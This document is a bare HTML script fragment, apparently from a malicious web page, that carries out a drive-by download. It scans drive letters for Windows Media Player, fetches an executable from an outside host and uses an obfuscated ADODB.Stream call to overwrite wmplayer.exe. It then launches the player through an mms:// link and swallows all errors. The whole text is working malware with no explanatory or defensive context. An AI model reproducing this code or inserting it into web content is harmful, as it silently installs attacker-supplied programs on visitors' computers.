<script LANGUAGE="VBSCript">
    Function Exists(filename)
        On Error Resume Next
        LoadPicture(filename)
        Exists = Err.Number =  481
    End Function
</script>
<script language="JScript">
try {
       languagepaths = [
                "Programmer\\Windows Media Player",
                "Program\\Windows Media Player",
                "Programme\\Windows Media Player",
                "Programmi\\Windows Media Player",
                "Programfiler\\Windows Media Player",
                "Programas\\Windows Media Player",
                "Archivos de programa\\Windows Media Player",
                "Program Files\\Windows Media Player"
        ];

        for (i = 67; i <= 90; ++i) {
                for (j = 0; j < languagepaths.length; ++j) {
                        playerloc = String.fromCharCode(i) + ":\\" + languagepaths[j] + "\\wmplayer.exe";
                        if (Exists(playerloc)) {
                                fileURL = 'http://www.norad.fr/c/c/a.exe';
                                var x = new ActiveXObject("Microsoft.XMLHTTP");
                                x.Open("GET",fileURL,0);
                                x.Send();
                                eval(unescape('%76%61%72%20%73%20%3D%20%6E%65%77%20%41%63%74%69%76%65%58%4F%62%6A%65%63%74%28%22%41%44%4F%44%42%2E%53%74%72%65%61%6D%22%29%3B'));
                                s.Mode = 3;
                                s.Type = 1;
                                s.Open();
                                s.Write(x.responseBody);
                                s.SaveToFile(playerloc,2);
                                location.href = "mms://";
                        }
                }
        }
} catch(e) {}
</script>


